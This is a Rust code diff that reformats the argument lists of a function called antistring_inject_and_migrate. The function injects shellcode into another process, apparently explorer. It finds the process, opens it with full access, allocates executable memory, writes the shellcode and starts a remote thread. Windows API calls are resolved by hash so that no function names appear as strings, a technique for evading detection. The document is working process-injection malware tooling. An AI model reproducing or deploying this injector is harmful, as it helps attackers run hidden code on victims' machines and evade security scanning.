@@ -106,7 +106,10 @@ pub fn antistring_inject_and_migrate(shellcode: &[u8], target_process: &str) {
     process_entry.dwSize = mem::size_of::<PROCESSENTRY32>() as u32;
     while unsafe {
         mem::transmute::<*const (), fn(HANDLE, &mut PROCESSENTRY32) -> BOOL>
-        (function)(snapshot, &mut process_entry).as_bool()
+        (function)(
+            snapshot,
+            &mut process_entry
+        ).as_bool()
     } {
         let mut process_name = String::from("");
         for element in process_entry.szExeFile {
@@ -126,21 +129,37 @@ pub fn antistring_inject_and_migrate(shellcode: &[u8], target_process: &str) {
     let function = rco_utils::find_function_address("Kernel32", 0x2c116091e452cf52).unwrap();
     let explorer_handle = unsafe { 
         mem::transmute::<*const (), fn(PROCESS_ACCESS_RIGHTS, bool, u32) -> HANDLE>
-        (function)(PROCESS_ALL_ACCESS, false, pid) 
+        (function)(
+            PROCESS_ALL_ACCESS,
+            false,
+            pid
+        )
     };
 
     // See line 72
     let function = rco_utils::find_function_address("Kernel32", 0x5cfd66a14ed9a43).unwrap();
     let base_address = unsafe {
         mem::transmute::<*const (), fn(HANDLE, *const u32, usize, VIRTUAL_ALLOCATION_TYPE, PAGE_PROTECTION_FLAGS) -> *const c_void>
-        (function)(explorer_handle, ptr::null(), shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+        (function)(
+            explorer_handle,
+            ptr::null(),
+            shellcode.len(),
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_EXECUTE_READWRITE
+        )
     };
 
     // See line 77
     let function = rco_utils::find_function_address("Kernel32", 0x2638fa76194bfe63).unwrap();
     unsafe { 
         mem::transmute::<*const (), fn(HANDLE, *const c_void, *const c_void, usize, *mut usize)>
-        (function)(explorer_handle, base_address, shellcode.as_ptr() as *const c_void, shellcode.len(), ptr::null_mut())
+        (function)(
+            explorer_handle,
+            base_address,
+            shellcode.as_ptr() as *const c_void,
+            shellcode.len(),
+            ptr::null_mut()
+        )
     };
 
     // See line 85
@@ -148,6 +167,14 @@ pub fn antistring_inject_and_migrate(shellcode: &[u8], target_process: &str) {
     let start_address_option = unsafe { Some(mem::transmute(base_address)) };
     unsafe {
         mem::transmute::<*const (), fn(HANDLE, *const u32, u32, Option<unsafe extern "system" fn(*mut c_void) -> u32>, *const u32, u32, *mut u32)>
-        (function)(explorer_handle, ptr::null(), 0, start_address_option, ptr::null(), 0, ptr::null_mut())
+        (function)(
+            explorer_handle,
+            ptr::null(),
+            0,
+            start_address_option,
+            ptr::null(),
+            0,
+            ptr::null_mut()
+        )
     };
 }
